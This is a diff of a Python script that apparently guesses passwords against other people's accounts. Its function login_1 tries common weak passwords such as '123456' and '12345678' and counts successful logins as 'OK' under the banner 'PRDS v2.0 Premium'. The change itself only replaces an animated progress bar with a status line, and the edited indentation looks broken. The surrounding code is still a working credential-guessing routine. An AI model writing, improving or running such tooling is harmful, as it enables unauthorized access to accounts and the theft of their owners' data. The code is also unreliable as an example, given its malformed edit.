@@ -443,21 +443,15 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        for i in range(bar_length + 1):
-            filled = "█" * i
-            empty = "░" * (bar_length - i)
-
-            sys.stdout.write(
-                f"\r"
-                f"\x1b[38;5;201m✦\x1b[38;5;198m✦\x1b[38;5;45m✦  "
-                f"\x1b[1;38;5;51mNEON\x1b[38;5;207m•\x1b[38;5;51mBAR  "
-                f"\x1b[38;5;207m[\x1b[38;5;51m{filled}"
-                f"\x1b[38;5;240m{empty}\x1b[38;5;207m] "
-                f"\x1b[1;38;5;213m{int((i/bar_length)*100)}%"
-                f"  \x1b[38;5;45m✦\x1b[38;5;198m✦\x1b[38;5;201m✦"
-            )
+        sys.stdout.write(
+            f"\r"
+            f"\x1b[38;5;111m▰\x1b[38;5;117m▰\x1b[38;5;123m▰ "
+            f"\x1b[1;37m「\x1b[38;5;45m🌐 PRDS v2.0 Premium\x1b[1;37m」 "
+            f"\x1b[38;5;196m⟦\x1b[38;5;82mLoop: {loop}\x1b[38;5;196m⟧ "
+            f"\x1b[38;5;196m⟦\x1b[38;5;190mOK: {len(oks)}\x1b[38;5;196m⟧ "
+            f"\x1b[38;5;111m▰\x1b[38;5;117m▰\x1b[38;5;123m▰"
+)
             sys.stdout.flush()
-            time.sleep(0.025)
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
